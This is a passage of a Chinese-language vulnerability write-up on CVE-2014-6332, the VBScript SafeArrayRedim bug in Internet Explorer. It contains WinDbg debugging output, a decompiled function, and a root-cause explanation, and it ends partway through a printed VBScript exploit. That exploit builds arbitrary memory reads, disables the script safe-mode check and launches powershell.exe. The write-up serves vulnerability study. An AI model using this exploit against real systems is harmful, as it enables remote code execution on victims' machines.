5</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>调试上面poc，使用IE打开poc后附加 IE 进程，在<code>vbscript!VbsIsEmpty</code>对 <code>IsEmpty</code>下断点进行调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bu vbscript!VbsIsEmpty</span><br><span class="line">0:013&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 14:39:48.836 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=024ad034 ecx=6a32a9d8 edx=024acfac esi=01f8a088 edi=00000001</span><br><span class="line">eip=6a2ec206 esp=024acec8 ebp=024aced8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; kv 2</span><br><span class="line">ChildEBP RetAddr  Args to Child</span><br><span class="line">024acec4 6a2d3854 024acfac 00000001 003dfb00 vbscript!VbsIsEmpty (FPO: [3,0,0])</span><br><span class="line">024aced8 6a2d586e 024acfac 00000001 003dfb00 vbscript!StaticEntryPoint::Call+0x11 (FPO: [5,0,0])</span><br><span class="line">0:005&gt; dd 003dfb00 l4</span><br><span class="line">003dfb00  0000600c 00000000 01f87798 0010d850</span><br><span class="line">0:005&gt; dt tagVARIANT 003dfb00 vt wReserved1 wReserved2 wReserved3 pparray</span><br><span class="line">ole32!tagVARIANT</span><br><span class="line">   +0x000 vt         : 0x600c</span><br><span class="line">   +0x002 wReserved1 : 0</span><br><span class="line">   +0x004 wReserved2 : 0</span><br><span class="line">   +0x006 wReserved3 : 0</span><br><span class="line">   +0x008 pparray    : 0x01f87798  -&gt; 0x0010d850 tagSAFEARRAY</span><br><span class="line">0:005&gt; dd 01f87798 l4</span><br><span class="line">01f87798  0010d850 00000000 00000000 08cfd360</span><br><span class="line">0:005&gt; dd 0010d850 l8</span><br><span class="line">0010d850  08800001 00000010 00000000 000e5a28</span><br><span class="line">0010d860  00000006 00000000 53aee65f 88000000</span><br><span class="line">0:005&gt; dt tagSAFEARRAY 0010d850</span><br><span class="line">ole32!tagSAFEARRAY</span><br><span class="line">   +0x000 cDims            : 1</span><br><span class="line">   +0x002 fFeatures        : 0x880</span><br><span class="line">   +0x004 cbElements       : 0x10</span><br><span class="line">   +0x008 cLocks           : 0</span><br><span class="line">   +0x00c pvData           : 0x000e5a28</span><br><span class="line">   +0x010 rgsabound        : [1] tagSAFEARRAYBOUND</span><br><span class="line">0:005&gt; dt tagSAFEARRAYBOUND 0010d850 + 0x10</span><br><span class="line">UxTheme!tagSAFEARRAYBOUND</span><br><span class="line">   +0x000 cElements        : 6</span><br><span class="line">   +0x004 lLbound          : 0</span><br></pre></td></tr></table></figure>

<p>通过查看栈回溯观察第三个参数地址为<code>0x003dfb00</code>,而这个地址上存的其实是一个<code>VARIANT</code>类型。对比前面给出的<code>VARIANT</code>结构，可以看到其中<code>varType</code>为<code>0x600c</code>，查看前面<code>VARENUM</code>中的值，<code>0x600c</code>对应的类型其实是<code>VT_VARIANT|VT_ARRAY|VT_BYREF</code>,即当前<code>VARIANT</code>其实是一个数组引用，<code>0x01f87798</code>上存的是数组首地址的指针，而<code>0x0010d850</code>才是真正数组首地址值。其实看到<code>varType</code>类型为<code>0x600c</code>时，可以直接查看偏移<code>0xc</code>处的<code>DWORD</code>值，该值便是数组首地址。</p>
<p>将<code>0x0010d850</code>处值以<code>tagSAFEARRAY</code>结构展示，可以看到这是一个一维数组，数据存放在<code>0x000e5a28</code> <code>pvData</code>处，数组大小为<code>6</code>。</p>
<p>继续调试，我们在<code>vbscript!RedimPreserveArray</code>处下断点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; bu vbscript!RedimPreserveArray</span><br><span class="line">0:005&gt; bl</span><br><span class="line"> 0 e 6a2ec206     0001 (0001)  0:**** vbscript!VbsIsEmpty</span><br><span class="line"> 1 e 6a2e5891     0001 (0001)  0:**** vbscript!RedimPreserveArray</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 14:51:58.106 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=01f8778c ebx=024ad034 ecx=0010d850 edx=0000600c esi=01f8a3fd edi=00000000</span><br><span class="line">eip=6a2e5891 esp=024acee4 ebp=024acfdc iopl=0         nv up ei pl nz na po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203</span><br><span class="line">vbscript!RedimPreserveArray:</span><br><span class="line">6a2e5891 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; gu</span><br><span class="line">Tue Jun 25 14:52:26.436 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=024ad034 ecx=6a32a9d8 edx=024acfac esi=01f8a088 edi=00000001</span><br><span class="line">eip=6a2ec206 esp=024acec8 ebp=024aced8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure>

<p>此时断点是断在poc中的<code>redim Preserve arrayA(over)</code>语句。而变量<code>over</code>是一个很大的值<code>0x8000005</code>，系统在申请内存时不可能申请这么大的内存空间，但是由于存在<code>On Error Resume Next</code>语句，脚本会继续向下执行，因此在执行<code>gu</code>命令后程序会出错然后跳出<code>vbscript!RedimPreserveArray</code>函数，然后断在<code>vbscript!VbsIsEmpty</code>上。此时，我们再观察<code>arrayA</code>中的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 0010d850 l8</span><br><span class="line">0010d850  08800001 00000010 00000000 000e5a28</span><br><span class="line">0010d860  08000006 00000000 53aee65f 88000000</span><br><span class="line">0:005&gt; dt tagSAFEARRAYBOUND 0010d850 + 0x10</span><br><span class="line">UxTheme!tagSAFEARRAYBOUND</span><br><span class="line">   +0x000 cElements        : 0x8000006</span><br><span class="line">   +0x004 lLbound          : 0</span><br></pre></td></tr></table></figure>

<p>数组实际数据地址依然是<code>0x000e5a28</code>，但是数组大小却由原来的<code>0x6</code>变成了现在的<code>0x8000006</code>，而这个值就是poc中的<code>over</code>大小。</p>
<p>在 IDA 查看<code>oleaut32.dll</code>中负责实际内存调整的<code>SafeArrayRedim</code>函数:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">HRESULT __<span class="function">stdcall <span class="title">SafeArrayRedim</span><span class="params">(SAFEARRAY *psa, SAFEARRAYBOUND *psaboundNew)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SAFEARRAY *v2; <span class="comment">// esi@1</span></span><br><span class="line">  USHORT v3; <span class="comment">// cx@3</span></span><br><span class="line">  __int32 v4; <span class="comment">// eax@6</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// ebx@6		// 有符号的int类型</span></span><br><span class="line">  ULONG v6; <span class="comment">// ebx@9</span></span><br><span class="line">  LONG v7; <span class="comment">// edi@9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// eax@9</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">IMalloc</span> *<span class="title">v9</span>;</span> <span class="comment">// edi@11</span></span><br><span class="line">  SAFEARRAY *v10; <span class="comment">// eax@14</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax@17</span></span><br><span class="line">  SAFEARRAYBOUND *v13; <span class="comment">// eax@38</span></span><br><span class="line">  ULONG v14; <span class="comment">// [sp+Ch] [bp-18h]@9</span></span><br><span class="line">  LONG v15; <span class="comment">// [sp+10h] [bp-14h]@9</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">IMalloc</span> *<span class="title">v16</span>;</span> <span class="comment">// [sp+14h] [bp-10h]@6</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [sp+18h] [bp-Ch]@3</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// [sp+1Ch] [bp-8h]@9</span></span><br><span class="line">  <span class="keyword">size_t</span> Size; <span class="comment">// [sp+20h] [bp-4h]@7		//</span></span><br><span class="line">  SAFEARRAY *psaa; <span class="comment">// [sp+2Ch] [bp+8h]@6</span></span><br><span class="line">  SAFEARRAYBOUND *psaboundNewa; <span class="comment">// [sp+30h] [bp+Ch]@38</span></span><br><span class="line"></span><br><span class="line">  v2 = psa;				<span class="comment">// 待调整数组的指针</span></span><br><span class="line">  <span class="keyword">if</span> ( psa )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( psaboundNew )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = psa-&gt;fFeatures;</span><br><span class="line">      v17 = psa-&gt;fFeatures &amp; <span class="number">0x2000</span>; <span class="comment">// FADF_FIXEDSIZE</span></span><br><span class="line">      <span class="keyword">if</span> ( psa-&gt;cDims )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( psa-&gt;cLocks &gt; <span class="number">0</span> || v3 &amp; <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-2147352563</span>;</span><br><span class="line">        psaa = <span class="number">0</span>;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v4 = GetMalloc(&amp;v16);</span><br><span class="line">        v5 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( v4 &amp;&amp; v4 &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> v5;</span><br><span class="line">        Size = SafeArraySize(v2);				<span class="comment">// 获取原始数组大小</span></span><br><span class="line">        <span class="keyword">if</span> ( !Size || v2-&gt;pvData )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = v2-&gt;rgsabound[<span class="number">0</span>].cElements;		<span class="comment">// 原始数组元素个数</span></span><br><span class="line">          v7 = v2-&gt;rgsabound[<span class="number">0</span>].lLbound;</span><br><span class="line">          v2-&gt;rgsabound[<span class="number">0</span>] = *psaboundNew;		<span class="comment">// 新的数组 SAFEARRAYBOUND 替换原来的</span></span><br><span class="line">          v14 = v6;</span><br><span class="line">          v15 = v7;</span><br><span class="line">          v8 = SafeArraySize(v2);</span><br><span class="line">          v18 = v8;</span><br><span class="line">          <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )					<span class="comment">// 验证是否替换成功，失败则还原</span></span><br><span class="line">          &#123;</span><br><span class="line">            v2-&gt;rgsabound[<span class="number">0</span>].cElements = v6;</span><br><span class="line">            v2-&gt;rgsabound[<span class="number">0</span>].lLbound = v7;</span><br><span class="line">            v5 = <span class="number">-2147024882</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v5 = v8 - Size;				<span class="comment">// 计算数组大小改动的差值</span></span><br><span class="line">            <span class="keyword">if</span> ( v8 != Size )</span><br><span class="line">            &#123;</span><br><span class="line">              v9 = v16;</span><br><span class="line">              <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> &amp;&amp; v2-&gt;fFeatures &amp; <span class="number">0xF20</span> )	<span class="comment">// v5是有符号数，只有值大于0x8000000则恒小于0</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v17 )</span><br><span class="line">                &#123;</span><br><span class="line">                  psaa = (SAFEARRAY *)((<span class="keyword">char</span> *)v2-&gt;pvData + v8);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v10 = (SAFEARRAY *)v16-&gt;lpVtbl-&gt;Alloc(v16, -v5);</span><br><span class="line">                  psaa = v10;</span><br><span class="line">                  <span class="keyword">if</span> ( !v10 )			<span class="comment">// 如果内存分配失败，直接返回，没有将数组大小还原</span></span><br><span class="line">                    <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">                  <span class="built_in">memcpy</span>(v10, (<span class="keyword">char</span> *)v2-&gt;pvData + v18, -v5);</span><br><span class="line">                  v8 = v18;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v17 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v8 &lt;= Size )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">                v13 = (SAFEARRAYBOUND *)v9-&gt;lpVtbl-&gt;Alloc(v9, v8);</span><br><span class="line">                psaboundNewa = v13;</span><br><span class="line">                <span class="keyword">if</span> ( v13 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">memcpy</span>(v13, v2-&gt;pvData, Size);</span><br><span class="line">                  v2-&gt;pvData = psaboundNewa;</span><br><span class="line">                  v2-&gt;fFeatures &amp;= <span class="number">0xDFFF</span>u;</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v11 = (<span class="keyword">int</span>)v9-&gt;lpVtbl-&gt;Realloc(v9, v2-&gt;pvData, v8);</span><br><span class="line">                <span class="keyword">if</span> ( v11 )</span><br><span class="line">                &#123;</span><br><span class="line">LABEL_18:</span><br><span class="line">                  v2-&gt;pvData = (PVOID)v11;</span><br><span class="line">LABEL_19:</span><br><span class="line">                  <span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="built_in">memset</span>((<span class="keyword">char</span> *)v2-&gt;pvData + Size, <span class="number">0</span>, v5);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( psaa )</span><br><span class="line">                      ReleaseResources(v2, (VARIANTARG *)psaa, -v5, v2-&gt;fFeatures, v2-&gt;cbElements);</span><br><span class="line">                    <span class="keyword">if</span> ( v17 )</span><br><span class="line">                      psaa = <span class="number">0</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v5 = <span class="number">0</span>;</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( !v18 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v11 = (<span class="keyword">int</span>)v9-&gt;lpVtbl-&gt;Alloc(v9, <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              v2-&gt;rgsabound[<span class="number">0</span>].cElements = v14;</span><br><span class="line">              v2-&gt;rgsabound[<span class="number">0</span>].lLbound = v15;</span><br><span class="line">LABEL_32:</span><br><span class="line">              v5 = <span class="number">-2147024882</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">              <span class="keyword">if</span> ( psaa )</span><br><span class="line">                v9-&gt;lpVtbl-&gt;Free(v9, psaa);</span><br><span class="line">              <span class="keyword">return</span> v5;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> v5;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-2147024809</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面代码中，可以看出该漏洞成因主要有两点：</p>
<ol>
<li>本身数组结构中的元素个数<code>cElements</code>字段为无符号类型，而在处理新旧数组元素个数的时候却使用了有符号数来保存差值。这就导致了当新旧数组的元素个数的差值相差大于了<code>0x8000000</code>时，上面代码中的<code>v5</code>会将最高位的<code>1</code>解释成符号位，从而使得<code>v5</code>恒小于<code>0</code>，在后面判断中进入了错误的分支。</li>
<li><code>SafeArrayRedim</code>在调整数组大小时，是先将<code>psaboundNew</code>结构赋值给<code>psa-&gt;rgsabound</code>，然后再去申请内存空间，但是如果内存申请失败，存在一个分支，会直接让函数返回而不对数组大小进行还原。使得原数组变成了一个超长数组，导致了任意地址的读写。</li>
</ol>
<h3 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h3><p>完整poc如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CVE-2014-6332 POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">dim   arrayA()</span><br><span class="line">dim   arrayB()</span><br><span class="line">dim   arraySize</span><br><span class="line">dim   overSize</span><br><span class="line">dim   index</span><br><span class="line">dim   myarray</span><br><span class="line"></span><br><span class="line">function Begin()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    BeginInit()</span><br><span class="line"></span><br><span class="line">    If CreateArray() = True Then</span><br><span class="line">        Trigger()</span><br><span class="line">    end if</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function BeginInit()</span><br><span class="line">    Randomize()</span><br><span class="line">    redim arrayA(2)</span><br><span class="line">    redim arrayB(2)</span><br><span class="line">    arraySize = 5</span><br><span class="line">    index = 2</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function readMemory(addr)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    redim  Preserve arrayA(overSize)</span><br><span class="line">    arrayB(0) = 0</span><br><span class="line">    arrayA(arraySize + 2) = addr + 4</span><br><span class="line">    arrayB(0) = 1.69759663316747E-313</span><br><span class="line">    readMemory = lenb(arrayA(arraySize + 2))</span><br><span class="line">    arrayB(0) = 0</span><br><span class="line">    redim  Preserve arrayA(arraySize)</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function RunWin32Exe()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    set shell=createobject("Shell.Application")</span><br><span class="line">    shell.ShellExecute "powershell.exe"</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function Trigger()</span><br><span class="line">    On Error Resume Next</span><br><span class="line"></span><br><span class="line">    pCScriptEntryPoint = setCScriptEntryPoint()</span><br><span class="line"></span><br><span class="line">    pAddr = readMemory(pCScriptEntryPoint + 8)</span><br><span class="line">    pAddr = readMemory(pAddr + 16)</span><br><span class="line"></span><br><span class="line">    for offset = 0 to &amp;h60 step 4</span><br><span class="line">        progId = readMemory(pAddr + &amp;h120 + offset)</span><br><span class="line">        if(progId = 14) then</span><br><span class="line">            redim  Preserve arrayA(overSize)</span><br><span class="line">            arrayA(arraySize + 4)(pAddr + &amp;h11c + offset) = arrayB(4)</span><br><span class="line">            redim  Preserve arrayA(arraySize)</span><br><span class="line">            Exit for</span><br><span class="line">        end if</span><br><span class="line">    next</span><br><span class="line">    RunWin32Exe()</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">sub testfunc()</span><br><span class="line">end sub</span><br><span class="line"></span><br><span class="line">function setCScriptEntryPoint()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    myarray = chrw(01)&amp;chrw(2176)&amp;chrw(01)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)</span><br><span class="line">    myarray = myarray&amp;chrw(00)&amp;chrw(32767)&amp;chrw(00)&amp;chrw(0)</span><br><span class="line"></span><br><span class="line">    pScriptEntryPoint = testfunc</span><br><span class="line">    pScriptEntryPoint = null</span><br><span class="line">    Msgbox "waiting for debug"</span><br><span class="line">    IsEmpty(arrayA)</span><br><span class="line">    IsEmpty(arrayB)</span><br><span class="line">    redim  Preserve arrayA(overSize)</span><br><span class="line">    arrayB(0) = 0</span><br><span class="line">    arrayA(arraySize + 2) = pScriptEntryPoint</span><br><span class="line">    arrayB(0) = 6.36598737437801E-314</span><br><span class="line">    arrayA(arraySize + 4) = myarray</span><br><span class="line">    arrayB(2) = 1.74088534731324E-310</span><br><span class="line">    setCScriptEntryPoint = arrayA(arraySize + 2)</span><br><span class="line">    redim  Preserve arrayA(arraySize)</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function Over()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    dim type1</span><br><span class="line">    Over = False</span><br><span class="line"></span><br><span class="line">    arraySize = arraySize + index</span><br><span class="line">    overSize = arraySize + &amp;h8000000</span><br><span class="line"></span><br><span class="line">    redim  Preserve arrayA(arraySize)</span><br><span class="line">    redim  arrayB(arraySize)</span><br><span class="line">    redim  Preserve arrayA(overSize)</span><br><span class="line">    arrayA(arraySize) = 10</span><br><span class="line">    arrayB(0) = 1.123456789012345678901234567890</span><br><span class="line">    type1 = 1</span><br><span class="line"></span><br><span class="line">    If (IsObject(arrayA(arraySize + 1)) = False) Then</span><br><span class="line"><span class="xml">        if(vartype(arrayA(arraySize + 1)) <span class="tag">&lt;&gt;</span> 0) Then</span></span><br><span class="line">            If(IsObject(arrayA(arraySize + 2)) = False ) Then</span><br><span class="line">                type1=VarType(arrayA(arraySize + 2))</span><br><span class="line">           end if</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line"></span><br><span class="line">    If(type1=&amp;h2f66) Then</span><br><span class="line">        Over = True</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    redim  Preserve arrayA(arraySize)</span><br><span class="line">end function</span><br><span 